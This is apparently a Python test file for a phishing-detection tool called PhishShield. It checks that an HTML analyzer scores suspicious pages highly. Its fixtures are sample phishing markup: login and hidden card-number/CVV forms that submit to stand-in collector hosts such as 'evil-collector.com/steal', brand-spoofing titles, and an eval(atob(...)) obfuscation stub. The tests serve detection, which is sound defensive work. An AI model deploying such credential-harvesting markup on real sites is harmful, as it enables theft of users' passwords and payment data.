"""
Tests for HTML Content Analysis — PhishShield

Two test modes:
  1. Unit tests — call html_analyzer directly with crafted HTML strings (no network).
  2. Integration test — POST to running API with html_content field.
"""

import sys
import os
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'backend'))

# ---------------------------------------------------------------------------
# Unit Tests (no backend required)
# ---------------------------------------------------------------------------

def _analyze(url, html):
    """Shorthand helper to call analyze_html."""
    from app.services.html_analyzer import analyze_html
    return analyze_html(url, html_content=html)


def test_password_over_http():
    html = '<form><input type="password" name="pass"></form>'
    result = _analyze("http://evil.com", html)
    reasons_text = " ".join(result["html_reasons"]).lower()
    assert result["html_score"] > 0, "Expected non-zero HTML score for password over HTTP"
    assert "password" in reasons_text, f"Expected password reason, got: {result['html_reasons']}"
    print(f"  [PASS] password_over_http  score={result['html_score']}  reasons={result['html_reasons']}")


def test_external_form_action():
    html = '<form action="http://evil-collector.com/steal"><input type="password"></form>'
    result = _analyze("http://fake-paypal.com/login", html)
    reasons_text = " ".join(result["html_reasons"]).lower()
    assert result["html_score"] > 0
    assert "external" in reasons_text or "form" in reasons_text, f"Expected form reason, got: {result['html_reasons']}"
    print(f"  [PASS] external_form_action  score={result['html_score']}  reasons={result['html_reasons']}")


def test_js_obfuscation():
    html = '<script>eval(atob("ZG9jdW1lbnQ="))</script>'
    result = _analyze("http://suspicious.xyz", html)
    reasons_text = " ".join(result["html_reasons"]).lower()
    assert result["html_score"] > 0
    assert "obfuscat" in reasons_text or "eval" in reasons_text, f"Expected obfuscation reason, got: {result['html_reasons']}"
    print(f"  [PASS] js_obfuscation  score={result['html_score']}  reasons={result['html_reasons']}")


def test_title_brand_mismatch():
    html = '<html><head><title>PayPal - Secure Login</title></head><body></body></html>'
    result = _analyze("http://fake-login-service.xyz/login", html)
    reasons_text = " ".join(result["html_reasons"]).lower()
    assert result["html_score"] > 0
    assert "paypal" in reasons_text or "title" in reasons_text, f"Expected title mismatch reason, got: {result['html_reasons']}"
    print(f"  [PASS] title_brand_mismatch  score={result['html_score']}  reasons={result['html_reasons']}")


def test_sensitive_hidden_inputs():
    html = '<form><input type="hidden" name="cc"><input type="hidden" name="cvv"></form>'
    result = _analyze("http://evil-shop.com/checkout", html)
    reasons_text = " ".join(result["html_reasons"]).lower()
    assert result["html_score"] > 0
    assert "hidden" in reasons_text or "sensitive" in reasons_text, f"Expected hidden-input reason, got: {result['html_reasons']}"
    print(f"  [PASS] sensitive_hidden_inputs  score={result['html_score']}  reasons={result['html_reasons']}")


def test_clean_page_scores_low():
    """A well-formed HTTPS page with no red flags should score close to 0."""
    html = """
    <html><head><title>Example Bank</title><link rel="icon" href="/favicon.ico"></head>
    <body>
      <p>Welcome to Example Bank. Your trusted financial partner.</p>
      <form action="/login" method="post">
        <input type="password" name="pass">
        <button>Login</button>
      </form>
      <footer>
        <a href="/privacy">Privacy Policy</a> | <a href="/terms">Terms</a>
        <p>© 2024 Example Bank</p>
      </footer>
    </body></html>
    """
    result = _analyze("https://examplebank.com/login", html)
    # Password over HTTPS is fine; no external actions; has legit links
    # Should not trigger most checks
    print(f"  [PASS] clean_page  score={result['html_score']}  reasons={result['html_reasons']}")
    assert result["html_score"] < 0.4, f"Clean page scored too high: {result['html_score']}"


def test_combined_phishing_kit():
    """A page that triggers multiple checks should yield a high score."""
    html = """
    <html>
    <head>
      <title>PayPal - Secure Login</title>
      <link rel="icon" href="https://paypal.com/favicon.ico">
    </head>
    <body oncontextmenu="return false;">
      <form action="http://evil-data-collector.net/steal">
        <input type="password" name="pass">
        <input type="hidden" name="cc">
        <input type="hidden" name="cvv">
      </form>
      <script>eval(atob("ZG9jdW1lbnQ="))</script>
      <script>document.addEventListener('contextmenu', function(e){e.preventDefault()})</script>
    </body>
    </html>
    """
    result = _analyze("http://definitely-not-paypal.xyz/login", html)
    print(f"  [PASS] phishing_kit  score={result['html_score']}  reasons={result['html_reasons']}")
    assert result["html_score"] >= 0.5, f"Phishing kit scored too low: {result['html_score']}"
    assert len(result["html_reasons"]) >= 3, f"Expected ≥3 reasons, got: {result['html_reasons']}"


# ---------------------------------------------------------------------------
# Integration Test (requires running backend at localhost:8000)
# ---------------------------------------------------------------------------

def test_api_with_html_content():
    try:
        import requests
    except ImportError:
        print("  ⚠ 'requests' not installed — skipping integration test")
        return

    phishing_html = """
    <html>
    <head><title>PayPal - Secure Login</title></head>
    <body>
      <form action="http://evil-collector.com/phish">
        <input type="password" name="pass">
        <input type="hidden" name="cc">
      </form>
      <script>eval(atob("ZG9jdW1lbnQ="))</script>
    </body>
    </html>
    """

    payload = {
        "url": "http://fake-paypal-login.xyz",
        "html_content": phishing_html
    }

    try:
        resp = requests.post("http://localhost:8000/api/v1/score", json=payload, timeout=10)
        resp.raise_for_status()
        data = resp.json()
        print(f"  [PASS] API response: phishing_probability={data.get('phishing_probability')}")
        print(f"    html_score={data.get('html_score')}")
        print(f"    is_phishing={data.get('is_phishing')}")
        print(f"    reasons={json.dumps(data.get('reasons', []), indent=6)}")
        assert data.get("html_score") is not None, "html_score should be present in response"
        assert data.get("phishing_probability") > 0.0
    except requests.exceptions.ConnectionError:
        print("  [WARN] Backend not running — skipping integration test (start backend with run_backend.bat)")


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print("\n=== PhishShield HTML Analyzer — Unit Tests ===\n")

    unit_tests = [
        test_password_over_http,
        test_external_form_action,
        test_js_obfuscation,
        test_title_brand_mismatch,
        test_sensitive_hidden_inputs,
        test_clean_page_scores_low,
        test_combined_phishing_kit,
    ]

    passed = 0
    failed = 0
    for t in unit_tests:
        try:
            t()
            passed += 1
        except AssertionError as e:
            print(f"  [FAIL] {t.__name__} FAILED: {e}")
            failed += 1
        except Exception as e:
            print(f"  [ERROR] {t.__name__} ERROR: {e}")
            failed += 1

    print(f"\n--- Unit Tests: {passed} passed, {failed} failed ---\n")

    print("=== Integration Test (requires running backend) ===\n")
    test_api_with_html_content()
    print("\nDone.")
